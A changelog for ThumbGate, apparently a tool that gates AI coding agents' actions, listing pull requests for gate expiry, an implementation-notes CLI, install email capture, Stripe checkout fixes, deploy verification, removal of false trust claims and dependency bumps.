- [#2140](https://github.com/IgorGanapolsky/ThumbGate/pull/2140) [`b641443`](https://github.com/IgorGanapolsky/ThumbGate/commit/b6414432c0e47638c9a80f1696000a0d5050a364) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add goal contracts to the evidence-before-done MCP gate so multi-agent worker/reviewer/orchestrator loops can require explicit proof actions before completion claims pass.

- [#2269](https://github.com/IgorGanapolsky/ThumbGate/pull/2269) [`41e6e59`](https://github.com/IgorGanapolsky/ThumbGate/commit/41e6e599eb20314f9ab0a8e637fae7c45197ae78) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(mcp): add `suggest_fix` tool for corrective action lookup from lesson DB
  feat(context-packs): auto-assemble context packs from top failure patterns
  feat(stats): first-time fix rate tracking with per-gate recurrence
  feat(stats): gate calibration analysis (over-blocking/well-calibrated/insufficient data)

- [#2252](https://github.com/IgorGanapolsky/ThumbGate/pull/2252) [`2a88b24`](https://github.com/IgorGanapolsky/ThumbGate/commit/2a88b2450c31fce70a33938eb6c2eedb9a530feb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `thumbgate notes` — a per-repo running implementation-notes capture for AI coding agents, inspired by the prompt pattern Anthropic's Thariq (@trq212) shared on X for Claude Code workflows.

  The pattern: as an agent implements against a spec, ambiguities and tradeoffs come up. Capturing them as they happen — instead of relying on the agent's session memory — keeps the human in the loop without slowing the agent down. ThumbGate now persists those decisions to `.thumbgate/implementation-notes.{md,jsonl}` (gitignored) and can promote any entry to a durable lesson via the existing capture-feedback pipeline.

  New surface:

  - `thumbgate notes append --decision="..." [--tool=<name>] [--rationale="..."] [--signal=info|up|down] [--tags=a,b,c]`
  - `thumbgate notes list [--limit=N] [--json]`
  - `thumbgate notes show <id>`
  - `thumbgate notes promote <id>` — calls the feedback-capture module to convert a note into a lesson.

  Module: `scripts/implementation-notes.js` (dependency-injection on `capture` to stay free of hard imports from the feedback pipeline). 8 tests in `tests/implementation-notes.test.js`.

  Hook integration (PostToolUse auto-append) is left for a follow-up so this PR can land standalone — the CLI surface is independently useful and exercised by tests.

- [#2198](https://github.com/IgorGanapolsky/ThumbGate/pull/2198) [`518c5cf`](https://github.com/IgorGanapolsky/ThumbGate/commit/518c5cf69404e4dae225df5bf8a36dc476b94bcc) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add npm install-email capture wedge to convert ~5,000 monthly installers into a re-engageable list.

  **The problem.** Daily revenue audit, May 19: 5,071 npm installs in last 30 days, ~3,925 visitors to thumbgate.ai/30d, 257 Stripe checkout starts, **0 external paid conversions**. The postinstall banner is the only surface every installer touches and it had no email capture. Zero leads collected from the entire 30-day install volume.

  **Fix:**

  1. **`bin/cli.js subscribe` subcommand.** `npx thumbgate subscribe you@company.com` POSTs `{ email, source, installId, cliVersion }` to `/v1/marketing/install-email`. Validates email shape client-side; never prompts interactively (postinstall must stay CI-safe). Per-attempt timeout 8s, exit codes 0/1/2/3 for success / bad-input / server-rejection / network-error.

  2. **`POST /v1/marketing/install-email` server route in `src/api/server.js`.** Validates email against RFC 5321-bounded regex, clips overlong source/installId/cliVersion fields, persists capture to a **dedicated `marketing-install-emails.jsonl` ledger** (the standard telemetry sanitizer strips PII by design, so a separate sink is required), emits a privacy-clean `marketing_install_email_captured` telemetry ping for funnel attribution, then fires `sendNewsletterWelcomeEmail` via the existing Resend mailer. Mailer failure (e.g., `RESEND_API_KEY` unset) does NOT fail the capture — the operator can drip later from the ledger.

  3. **`bin/postinstall.js` banner update.** New line `npx thumbgate subscribe you@company.com` between the free-start lines and the dashboard URL, sized to fit the existing box.

  4. **`tests/install-email-capture.test.js` — 8 tests, all green:**
     - OPTIONS preflight returns CORS headers
     - POST happy path: ok:true, ledger row written, telemetry ping fired WITHOUT email field
     - POST missing email → 400 invalid_email
     - POST malformed email → 400 invalid_email
     - POST invalid JSON → 400 invalid_json
     - POST oversized body → 413 payload_too_large
     - POST oversized non-email fields → clipped to defaults (source) or null (installId/cliVersion), not crash
     - postinstall.js source contains the `npx thumbgate subscribe` line

  **What this PR does NOT do:**

  - Does not change the postinstall banner outside the single new line.
  - Does not add a Stripe-side flow.
  - Does not assume `RESEND_API_KEY` is set; capture works without it.
  - Does not collect any PII in the standard telemetry stream — the dedicated ledger is the only place email lands.

  **Expected outcome at 5% opt-in:** ~250 captured emails / 30 days vs current 0. Even at 1% it is 50/month — meaningfully better than zero.

- [#2119](https://github.com/IgorGanapolsky/ThumbGate/pull/2119) [`4deb042`](https://github.com/IgorGanapolsky/ThumbGate/commit/4deb042216e850dec733ad6b4867a38690bbd490) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - **Moat decision (2026-05-18, audit-based).** Settles the "is the public/private split real?" question. Audit found 212 of 216 Core scripts also ship publicly via npm (98% overlap). The previous CLAUDE.md framing was aspirational; in practice the boundary did not exist.

  This commit picks Option A from the strict assessment: **hosted-services moat, not closed-source intelligence.** Public code is permissive on purpose. The defensibility surfaces are (a) hosted infrastructure + reliability, (b) adapter compatibility matrix across Claude / Cursor / Codex / Gemini / Amp / Cline / OpenCode, (c) the dashboard + DPO export pipeline, (d) sprint / setup support revenue.

  Surfaces:

  - `MOAT.md` — full reasoning, including the 412 / 216 / 212 / 4 file-count breakdown
  - `CLAUDE.md` — "Product Architecture Split" section rewritten as "Moat — Hosted Services, Not Closed-Source Intelligence." Four active rules replace the previous five aspirational ones
  - `tests/public-bundle-ratchet.test.js` — pins the npm bundle file count at the 2026-05-18 baseline (254 files). Can decrease, cannot increase without a baseline bump + CHANGELOG note. Override env var `THUMBGATE_BUNDLE_RATCHET_BASELINE` documented inline
  - `package.json` — `test:public-bundle-ratchet` wired into the main `test` chain so the regression-guard runs

  `tests/public-core-boundary.test.js` is unchanged and stays green — it tests that default public CI doesn't depend on Core, which is still a real correctness property.

- [#2191](https://github.com/IgorGanapolsky/ThumbGate/pull/2191) [`7ae4a15`](https://github.com/IgorGanapolsky/ThumbGate/commit/7ae4a158bc42d02c136af23ef2071682bed0cdd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Automate post-deploy verification of top-level marketing pages.

  The existing `.github/workflows/deploy-verify.yml` already checks `/health` version and `/dashboard` after every push to main, plus sample-curls any `public/learn|guides|compare/*.html` route added in the diff. Top-level marketing pages — `/`, `/pro`, `/federal`, `/numbers`, `/llm-context.md`, `/robots.txt`, `/sitemap.xml` — had no automated coverage; a deploy that 500'd or returned blank HTML on those routes would only be caught by a real visitor.

  This PR closes that gap with three additive surfaces:

  1. **`config/post-deploy-marketing-pages.json`** — sentinel manifest. Each entry pairs a route with a stable body-copy sentinel string. Adding a new top-level marketing page = appending to JSON, no workflow edit required.

  2. **`scripts/verify-marketing-pages-deployed.js`** — config-driven probe. Curls each manifest entry against `https://thumbgate-production.up.railway.app` (overridable via `THUMBGATE_PROD_URL` env or `--prod-url=…`), asserts sentinel present in response body. Exit 0 on full pass, 1 on any miss. Human or `--json` output. Browser-shaped UA so bot-deflection interstitials don't trigger false positives.

  3. **`.github/workflows/deploy-verify.yml`** — new step `Verify top-level marketing pages still match sentinels` after the existing `/dashboard` check. The success and failure PR comments now surface "**N/M** top-level marketing pages match their sentinel manifest" or the failure detail.

  Verified locally: probe runs against current production returns **8/8 pages PASS**. 16 unit tests at **87.69% line coverage**, **89.58% branch coverage** on the probe script — comfortably above SonarCloud's 80% gate.

  Ratchet ceilings bumped 254 → 256 (both `tests/public-bundle-ratchet.test.js` and `tests/package-boundary.test.js`) for the probe script + manifest JSON. The probe ships in the public npm bundle so external operators self-hosting ThumbGate get the same regression guard against their own deployment.

- [#2193](https://github.com/IgorGanapolsky/ThumbGate/pull/2193) [`b1f0160`](https://github.com/IgorGanapolsky/ThumbGate/commit/b1f01602e0ab0c5c59fe0f3ab52cbf9f51562ca2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(security): implement high-ROI PostgreSQL AI guardrails (Google AI DB mandate)

- [#2068](https://github.com/IgorGanapolsky/ThumbGate/pull/2068) [`14ca38a`](https://github.com/IgorGanapolsky/ThumbGate/commit/14ca38ab90fa4640bc891115fdcbf8f4f06a66c8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Reverse trial, README hero rewrite, and GTM content for first-dollar push.

  - **Reverse trial**: 14-day full Pro access for new installs. `isInTrialPeriod()` checks install-ID file age; `isProTier()` grants Pro during trial window. Post-install banner announces trial with dashboard URL and upgrade path.
  - **README hero**: Replaced wordy 15-line opening with tight pain-first copy and a concrete blocked-action terminal example. Leads with "AI agents repeat mistakes. You pay for every retry."
  - **GTM content**: Show HN post, Reddit r/ClaudeAI post, Twitter build-in-public thread, 30-second demo script, README hero draft — all in `docs/marketing/`.
  - **Test coverage**: Updated rate-limiter tests for trial functions and postinstall tests for new banner content. All passing.

- [#2178](https://github.com/IgorGanapolsky/ThumbGate/pull/2178) [`64ee4b3`](https://github.com/IgorGanapolsky/ThumbGate/commit/64ee4b320d7e0961527f918abb8d7051b3fc2742) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix the revenue funnel narrative — three changes that stop the page from arguing against its own paid tier.

  **Pro checkout interstitial (`/checkout/pro`)** — drop "MIT-licensed CLI included" and "MIT open source · no vendor lock-in" from the trust bar; they advertise the reason not to pay. Lead instead with what the subscription actually buys: hosted lesson sync across machines, adapter matrix for 7 agent runtimes, hosted dashboard, 24×7 ops.

  **Pro card on `/` home page** — same fix at the top of the price column. The free npm package is local-only and never expires; Pro is the operated hosted state. Make that the first thing the visitor reads.

  **npm postinstall banner** — add the hosted dashboard URL so installers know it exists, and replace "personal local dashboard, DPO export" with the hosted-state Pro value-prop. At ~5,000 installs/30d this is the highest-leverage surface we have for converting installs into site visits.

  **Removed bare "$4,800/mo + $7,500 sprint" enterprise pricing** from the Regulated tier on the home page — keep it for the intake call instead of scaring retail buyers.

  Motivation: external customer audit shows lifetime external revenue = $0 and 2,252 checkout sessions with 1 external completion (0.04%). MOAT.md openly states 212 of 216 Core scripts ship publicly. Until the page answers "why pay when npm install gives me everything," the funnel will keep producing this result.

- [#2110](https://github.com/IgorGanapolsky/ThumbGate/pull/2110) [`eca1d4e`](https://github.com/IgorGanapolsky/ThumbGate/commit/eca1d4eca0a0c9541aa5ce0019676f050716c3db) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Auto-promoted gates now expire. Default TTL is 90 days from promotion; tunable via `THUMBGATE_RULE_TTL_DAYS`. Gates that fire within the window have their TTL refreshed automatically (high-signal rules survive, dormant ones age out). Manually force-promoted gates (`MANUAL=1`) remain permanent (`expiresAt=null`).

  Addresses the public critique from r/ClaudeCode (MomSausageandPeppers, 2026-05-17): "make single thumbs-down promotion reversible or expiry-bound; otherwise accidental dislikes become policy forever." Previously, one thumbs-down at `BLOCK_THRESHOLD` could pin a gate on disk indefinitely with no decay path.

  New exports on `scripts/auto-promote-gates.js`:

  - `expireGates(data, now?)` — sweeps expired gates, refreshes recently-fired ones
  - `recordGateFire(data, gateId, now?)` — call when a gate actually blocks; updates `lastFiredAt` and extends `expiresAt`
  - `getRuleTtlDays()` / `getRuleTtlMs()` / `DEFAULT_RULE_TTL_DAYS`

  `promote()` now calls `expireGates()` before the promotion loop, so every daily run garbage-collects stale rules. New gate records carry `expiresAt` (ISO date) and `lastFiredAt` (null until first block). Malformed input (missing `gates`, non-array `gates`) is tolerated without throwing.

  10 new unit tests in `tests/auto-promote-gates.test.js` cover TTL defaults, env override (with negative/non-numeric fallback), expiry sweep, refresh-on-fire, permanent-gate semantics, and malformed-input tolerance. All 30 tests in the file pass.

- [#2149](https://github.com/IgorGanapolsky/ThumbGate/pull/2149) [`9f41191`](https://github.com/IgorGanapolsky/ThumbGate/commit/9f41191fc05b39a2617c7ac994ad322780cc6f2f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Adds `scripts/stripe-payment-link-update.js` — the API-reachable lever for branded checkout pages. Stripe's `business_profile` + `branding` endpoints reject own-account writes (verified HTTP 403 on 2026-05-18), but `stripe.paymentLinks.update(id, params)` works on own-account links.

  Targets the 3 customer-facing Payment Links documented in `docs/audits/payment-links-2026-05-18.md`:

  - **$499 Sprint Diagnostic** (`buy.stripe.com/3cI7sLgH25v8dWh5e33sI0o`)
  - **$1,500 Workflow Hardening Sprint** (`buy.stripe.com/8x25kDcqMaPs9G15e33sI0p`)
  - **$97 OpenClaw Governance Kit** (`buy.stripe.com/bJe14naiE9Lo7xT49Z3sI12`)

  For each, sets:

  1. `custom_text.submit.message` — refund window + delivery promise (the urgency/trust copy buyers see on the checkout page)
  2. `metadata` — `utm_source`, `cta_id`, `attribution_version`, `offer_kind` (so paid conversions can be attributed back to the campaign)
  3. `automatic_tax.enabled = true` (so international buyers see correct totals)

  10 unit tests against a mocked Stripe SDK cover: empty-link planning, full-link no-op, dry-run-no-writes, missing-slug error, page-traversal in `resolvePlinkId`, applyAll across all targets, and human-readable rendering. All passing.

  Workflow `stripe-payment-link-update.yml` runs `--dry-run` on every push to the branch (so every commit shows what would change before merge) and only writes on explicit `workflow_dispatch` with `mode=apply`. Concurrency-gated so two runs can't race.

  The other 97 active Payment Links on the account are deliberately left alone — they're noise from past iterations and changing them risks breaking embeds we don't know about.

- [#2244](https://github.com/IgorGanapolsky/ThumbGate/pull/2244) [`51f545c`](https://github.com/IgorGanapolsky/ThumbGate/commit/51f545cc4a3e255cd0c2a4efa36c722b198d4e3f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Adds Volta-style auto-update shim at `~/.thumbgate/bin/thumbgate-hook`. Hook commands now resolve through a stable shim that always runs `thumbgate@latest`, surviving across version bumps without re-wiring Claude settings. Fast path uses cached runtime binary; slow path falls back to `npx --yes thumbgate@latest`.

### Patch Changes

- [#2167](https://github.com/IgorGanapolsky/ThumbGate/pull/2167) [`22de2e0`](https://github.com/IgorGanapolsky/ThumbGate/commit/22de2e03b0590d9cae6e33733df705cd1b41ab45) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Aligns `.claude-plugin/plugin.json` and `.claude-plugin/marketplace.json` with the Anthropic official plugin marketplace submission form (https://claude.ai/settings/plugins/submit). Changes:

  **plugin.json:**

  - Short description rewritten to the submission-form copy (178 chars, under the 200-char form limit, includes "PreToolUse Pre-Action Checks" for backward compat with the claude-mcpb regression test)
  - Author block now includes email + url
  - Added `category: "developer-tools"`
  - Keywords expanded to include the 8 submission-form tags (guardrails, pretooluse, hooks, feedback, rlhf, dpo, agent-safety, workflow-hardening)

  **marketplace.json:**

  - Same short description
  - New `longDescription` field — the full tripwire-not-memory-layer narrative from the submission form (verifiable claims only: 33 pre-action checks, Claude Code / Cursor / Codex / Gemini / Amp / Cline / OpenCode adapter coverage, NIST/SOC2/OWASP/CWE tags, DPO export, Free + Pro $19/mo tiers)
  - `category: "developer-tools"` + 8 submission-form `tags`
  - New `capabilities` block: skills 2, commands 5, agents 1, hooks 3, mcpServer "thumbgate serve"
  - New `installCommand: "/plugin install thumbgate@claude-plugins-official"`
  - Author email + url
  - `keywords` expanded to match

  51/51 tests pass across `version-metadata`, `package-boundary`, `claude-mcpb`, `skill-exporter`, `thumbgate-skill`, `public-package-parity`. Bundle ratchet unchanged.

  This is the minimum manifest delta the marketplace submission needs. Demo GIF + npm version bump are separate workstreams.

- [#2091](https://github.com/IgorGanapolsky/ThumbGate/pull/2091) [`a3ef495`](https://github.com/IgorGanapolsky/ThumbGate/commit/a3ef495a06ebb8ace931c7bd404cd7c30d33f81d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/conversion-rate-stats.js` — honest Bayesian beta-binomial conversion-rate estimation for low-N revenue data.

  The audit on 2026-05-15 surfaced the right ML investment given ThumbGate's data volume: with only 3 lifetime orders and ~200 visitors per surface, frequentist conversion = charges/visitors produces dishonest rankings ("/pricing converts at 100%!" from one lucky charge on 1 visitor). The fix is a Bayesian beta-binomial model with a weakly-informative prior (Beta(1, 19), reflecting "most dev-tool surfaces convert at ~5% with broad uncertainty"). The posterior gives a credible interval that gets narrower as N grows: wide and honest at N=0, tight around the empirical rate at N=10k. Same code path, no need to switch models when data finally arrives.

  The module exports:

  - `posteriorParameters({successes, trials, priorAlpha, priorBeta})` — pure stats
  - `estimateConversionRate(...)` — returns posterior mean, mode, 95% credible interval, and a verdict (`insufficient_data` / `wide_uncertainty` / `credible`)
  - `rankSurfaces(surfaces, opts)` — ranks by lower-bound of credible interval (pessimistic ranking) by default. Prevents allocating traffic to a surface whose point estimate is high but whose lower bound is near zero.
  - `renderConversionMarkdown(ranked)` — produces a markdown table ready to drop into the unified revenue rollup once [#2090](https://github.com/IgorGanapolsky/ThumbGate/issues/2090) lands.

  Implementation includes a Lanczos approximation of log Γ, a Lentz continued-fraction evaluator for the regularized incomplete beta (CDF), and bisection on the CDF for the quantile function. No external dependencies — all pure-JS math.

  20 unit tests cover: known logΓ values, CDF identity at Beta(1,1) = uniform, Beta(2,2) symmetry, quantile/CDF round-trip, prior + observation accumulation, N=0 returns the pure prior, N=10k tightens to the empirical rate, the "N=2 trap" (1 conversion of 2 visitors maps to ~9% posterior, NOT 50%), verdict cutoffs, pessimistic-ranking ordering, and markdown render.

  Standalone for now; will fold into the unified revenue rollup as a follow-up after [#2090](https://github.com/IgorGanapolsky/ThumbGate/issues/2090) lands so we don't fight merge conflicts on the same file. Also reusable by `scripts/thompson-sampling.js` for adaptive surface allocation when transaction volume justifies it.

- [#2257](https://github.com/IgorGanapolsky/ThumbGate/pull/2257) [`911aee7`](https://github.com/IgorGanapolsky/ThumbGate/commit/911aee76d0c5747ab58a096d5a57670abd56303c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix `/health` reporting the wrong `buildSha` when a stale `THUMBGATE_BUILD_SHA` env var lingers on the runtime host. Invert precedence in `scripts/build-metadata.js`: the immutable JSON file baked into the Docker image at build time (which always matches the deployed code) now wins over mutable runtime env vars. Env vars fill in only when the file has no SHA.

  Also tightens the env-branch condition: previously a stray `THUMBGATE_BUILD_GENERATED_AT` with no SHA would short-circuit to `{ buildSha: null }`, losing both signals. Now the env branch requires an explicit SHA before being trusted.

  Background: 2026-05-20 — prod `/health` reported `version=1.21.2` but `buildSha=92f8e4b1` (a commit from days earlier). Root cause: the `Set Railway environment variables` step is gated by `RAILWAY_SYNC_VARIABLES=false` by default, so a once-set `THUMBGATE_BUILD_SHA` on Railway was never refreshed by subsequent deploys. The freshly-stamped `config/build-metadata.json` baked into the image had the correct SHA, but the env-wins precedence caused `resolveBuildMetadata` to return the stale env value instead.

  Side benefit: the `Verify deployment health` step in `.github/workflows/deploy-railway.yml` compares `LIVE_SHA` to `$GITHUB_SHA`; with this fix, that comparison now succeeds against the freshly-baked file SHA, unblocking the gate.

  Operator note: the persistent `THUMBGATE_BUILD_SHA` and `THUMBGATE_BUILD_GENERATED_AT` env vars on the Railway service can now be safely deleted from the dashboard — file precedence makes them moot.

- [#2123](https://github.com/IgorGanapolsky/ThumbGate/pull/2123) [`8ebc051`](https://github.com/IgorGanapolsky/ThumbGate/commit/8ebc051af66091622736dd64bd6446083d3dac6e) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `@anthropic-ai/sdk` from 0.95.2 to 0.96.0 (minor SDK release, no API surface changes affecting ThumbGate's usage). Pulls in upstream bug fixes and updated TypeScript typings from `@anthropic-ai/sdk` v0.96.x. Lockfile-only change; no runtime code modifications required.

- [#2126](https://github.com/IgorGanapolsky/ThumbGate/pull/2126) [`df0688e`](https://github.com/IgorGanapolsky/ThumbGate/commit/df0688ee2603b3827923487c7128b27580e7df7a) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `better-sqlite3` from 12.9.0 to 12.10.0 (minor release, no API surface changes affecting ThumbGate's usage). Pulls in upstream bug fixes from `better-sqlite3` v12.10.x. Lockfile-only change; no runtime code modifications required.

- [#2121](https://github.com/IgorGanapolsky/ThumbGate/pull/2121) [`50bf936`](https://github.com/IgorGanapolsky/ThumbGate/commit/50bf9366579cdd52ec049cfdf53021fad86714d9) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `playwright-core` from 1.59.1 to 1.60.0 (minor release, no API surface changes affecting ThumbGate's usage). Pulls in upstream bug fixes and updated browser binaries from `playwright-core` v1.60.x. Lockfile-only change; no runtime code modifications required.

- [#2124](https://github.com/IgorGanapolsky/ThumbGate/pull/2124) [`230fdb4`](https://github.com/IgorGanapolsky/ThumbGate/commit/230fdb461b0b5c861ca366eb3d0b2121084bf091) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `stripe` from 22.0.2 to 22.1.1 (minor SDK release, no API surface changes affecting ThumbGate's usage). Pulls in upstream bug fixes and updated TypeScript typings from `stripe-node` v22.1.x. Lockfile-only change; no runtime code modifications required.

- [#2122](https://github.com/IgorGanapolsky/ThumbGate/pull/2122) [`a3b4f30`](https://github.com/IgorGanapolsky/ThumbGate/commit/a3b4f30adaa43e5b7353164d9c78f0235d5f4229) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `undici` (dev dependency) from 8.2.0 to 8.3.0 (minor release, no API surface changes affecting ThumbGate's usage). Pulls in upstream bug fixes from `undici` v8.3.x. Lockfile-only change; no runtime code modifications required.

- [#2270](https://github.com/IgorGanapolsky/ThumbGate/pull/2270) [`59f6972`](https://github.com/IgorGanapolsky/ThumbGate/commit/59f69726623c1fc0f92d63f51fd653d98d6eb1e4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix statusline 👍/👎 counts not updating after `thumbgate capture` / `node .claude/scripts/feedback/capture-feedback.js` runs.

  **Background**: the statusline reads a cache file (`~/.thumbgate/statusline_cache.json`) that is normally refreshed by the `cache-update` PostToolUse hook — but that hook only fires for `mcp__thumbgate__feedback_stats` / `mcp__thumbgate__dashboard` MCP tool calls. When feedback is captured via Bash (the CLI), no MCP tool fires, the cache stays stale, and the bar keeps showing the old counts until the next dashboard call (potentially hours).

  **Fix**: capture-feedback.js now calls `refreshStatuslineCache(analyzeFeedback())` inline after a successful capture. Cache updates immediately; statusline reflects the new count on the very next render.

  **Notable subtlety found during implementation**: `feedbackSummary()` returns a string (the human-readable summary). When passed to `normalizeStatsPayload` it merges as a character array with numeric keys, producing the empty `{thumbs_up:'0', thumbs_down:'0'}` payload — no update. The correct stats API is `analyzeFeedback()` which returns the object shape `{ totalPositive, totalNegative, total, approvalRate, trend, rubric }` that `normalizeStatsPayload` expects.

  **Best-effort design**: if `scripts/hook-thumbgate-cache-updater` isn't available (minimal install), the call no-ops silently rather than failing the capture.

  **Verified locally**: captured 3 feedback entries, observed cache `updated_at` timestamp + `thumbs_up`/`thumbs_down` counters increment in real time, statusline-render reflected the new state.

- [#2191](https://github.com/IgorGanapolsky/ThumbGate/pull/2191) [`7ae4a15`](https://github.com/IgorGanapolsky/ThumbGate/commit/7ae4a158bc42d02c136af23ef2071682bed0cdd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a defensive guard in `createCheckoutSession` that refuses to create a Stripe checkout session when the only Stripe product matching the plan's product name (e.g. "ThumbGate Pro") is archived. Without this guard, `buildSubscriptionPriceData` passes inline `product_data` to Stripe, Stripe name-matches an archived product, creates a new price under it that inherits `active=false`, and every buyer sees "Something went wrong / The page you were looking for could not be found." on the Stripe checkout page.

  This is the May 2026 incident documented in ThumbGate#2188: 20 abandoned sessions in 7 days, 0 paid, 0 emails captured. The pattern looks like buyer abandonment in Stripe Dashboard but is actually a misconfiguration where every buyer was served a broken page from the moment they arrived.

  The new `verifyActiveProductForPlan(stripe, planId)` helper runs before `sessions.create` and throws with a clear remediation message if the matching product is only present in archived state. Best-effort on Stripe API transient failures (does not block checkout on infra hiccups). Tests pin the four behaviors: active product present (pass), no product (pass — Stripe will create one), only archived product (throw with diagnostic), Stripe API timeout (graceful pass).

- [#2137](https://github.com/IgorGanapolsky/ThumbGate/pull/2137) [`964552a`](https://github.com/IgorGanapolsky/ThumbGate/commit/964552aedf2547f31ab435fd863403ea5ec6be3a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Removes false trust claims from the live `/checkout/pro` interstitial. Verified ground truth via the existing audit (`~/.openclaw/memory/current-revenue-state.md` 2026-05-15) + the npm registry API:

  - "6 paying customers" → **0** real external customers (only Stripe charge was a founder self-purchase)
  - "18,000+ installs verified on npm" → **5,257** real downloads in the last 30 days (per `api.npmjs.org/downloads/range/last-month/thumbgate`)

  Both claims were live on the buyer-facing checkout page. Per the CLAUDE.md Honesty Protocol, removed and replaced with a verifiable claim: "5,200+ npm installs in the last 30 days (npm-stat verifiable)." Conservative round-down so the claim survives normal week-over-week noise.

  Adds a regression test in `tests/public-static-assets.test.js` that asserts `/checkout/pro` never contains a `\d+ paying customers` pattern or `18,000+ installs` claim. The existing landing-page banned-claims test already exists for `public/*.html` files but didn't cover the server-rendered interstitial — this closes that gap.

- [#2109](https://github.com/IgorGanapolsky/ThumbGate/pull/2109) [`df9a383`](https://github.com/IgorGanapolsky/ThumbGate/commit/df9a383c9b56ef8d9021e9892f95c6ecd93c0313) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/ci-cd-hygiene-audit.js` — daily audit that surfaces stale PRs, unresolved bot review threads, ignored CLEAN PRs, and repeatedly-failing workflows.

  This is the missing fire-alarm for the kind of problem that just bit us: on 2026-05-17 the CEO asked "why isn't v1.19.0 published?" and the audit-by-hand turned up [#1953](https://github.com/IgorGanapolsky/ThumbGate/issues/1953) sitting CLEAN for 5 days, 4 unresolved Codex bot threads across 2 PRs, and the release PR ([#2082](https://github.com/IgorGanapolsky/ThumbGate/issues/2082)) blocked on one failing test that nobody had looked at. None of it was visible until someone asked.

  Surfaces 5 signal classes:

  1. **Merge backlog** — CLEAN PRs sitting open ≥ 2 days
  2. **Unread review** — PRs with unresolved bot review threads (Codex / SonarCloud / etc.)
  3. **Stale conflicts** — DIRTY PRs open ≥ 5 days
  4. **Abandoned** — PRs with zero comments + zero reviews after 7 days
  5. **Broken workflows** — workflows that failed ≥3 times in the last 100 runs

  Wired into the Daily Revenue Loop alongside the existing rollups; outputs go to `reports/revenue/cicd-hygiene.{md,json}` and a GitHub Actions job-summary section. `--strict` exits 1 when the merge backlog reaches 3, so the workflow goes yellow when shipping hygiene is failing.

  10 unit tests with an injected fake `gh` exec cover all 5 buckets, the age math, the workflow-failure-threshold logic, and the markdown render (both populated and empty paths).

- [#2256](https://github.com/IgorGanapolsky/ThumbGate/pull/2256) [`45bc8cf`](https://github.com/IgorGanapolsky/ThumbGate/commit/45bc8cfc2da5cd5d569011e8b4eafbbb144315c0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship `/codex-enterprise` landing page riding the 2026-05-20 OpenAI×Dell Codex Enterprise distribution partnership. Dell-distributed Codex pushes the OpenAI coding agent from individual-developer install into org-wide procurement, which expands the TAM for ThumbGate's governance layer — the runtime that captures every agent decision, promotes repeat failures to PreToolUse gates, and ships the audit trail enterprise procurement requires.

  Three changes:

  1. **`public/codex-enterprise.html` — new landing page.** Hero direct-addresses the governance gap that arrives with enterprise distribution; three-card value prop maps to (a) capture (Thariq pattern productionized), (b) promote (PreToolUse gates), (c) audit (SOC 2 / EU AI Act trail). Install CTA is `npx thumbgate init --agent codex` plus a link to the standalone Codex plugin zip in GitHub releases. Footer cross-links to `/agent-manager` for role-level framing.

  2. **`src/api/server.js`** — dedicated `/codex-enterprise` (and `/codex-enterprise.html`) route. Routed through `servePublicMarketingPage` so partnership-news-cycle arrivals capture UTM attribution and `landing_page_view` telemetry with `pageType: 'codex_enterprise'`. Also added to `renderSitemapXml` so the page is crawlable from day one.

  3. **`tests/public-bundle-ratchet.test.js`** — baseline bumped 259 → 260 to account for the new `public/codex-enterprise.html` shipping in the npm bundle. Comment notes the partnership rationale.

  Regenerated `docs/marketing/codex-marketplace-revenue-pack.{md,json}` via `node scripts/codex-marketplace-revenue-pack.js --write-docs` to refresh URLs and timestamps against current package version.

- [#2264](https://github.com/IgorGanapolsky/ThumbGate/pull/2264) [`62dceff`](https://github.com/IgorGanapolsky/ThumbGate/commit/62dceff395d3098858fa677cdd349ac1808646d4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Update the Codex plugin agent instructions to use the published ThumbGate CLI entrypoints and add a regression test that blocks stale repo-local feedback commands.

- [#2096](https://github.com/IgorGanapolsky/ThumbGate/pull/2096) [`71bc77d`](https://github.com/IgorGanapolsky/ThumbGate/commit/71bc77df6ff06492d6652fafd0dd8a78eaee6571) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship two new public pages from competitive-intel on the Rein governance project (LinkedIn post by @jnwhampton, 2026-05-15):

  - `/compare/rein` — honest side-by-side. Both projects intercept agent actions before they fire; that's the shared category. The differences: integration layer (decorator vs PreToolUse hook), target user (production app agents in regulated domains vs AI coding agents), license (AGPL vs MIT), and learning loop (Rein has policy authoring; ThumbGate has thumbs-down → auto-promoted prevention rule). Not framed as "we win" — Rein is well-designed software, picks differ by stack.

  - `/learn/ai-agent-governance` — claim the SEO term Rein is targeting by defining the four-layer pattern (prompt rules / decorator wrappers / pre-action hooks / sandbox isolation) and positioning ThumbGate at layer 3. The page is layer-agnostic; it explicitly tells readers to pick Rein at layer 2 if Rein's profile matches their stack.

  Also wires both pages into `/compare` index card layout and adds them to the `tests/learn-hub.test.js` valid-internal-paths allowlist alongside `/learn/spec-driven-development` (the previous PR that was missed in that allowlist).

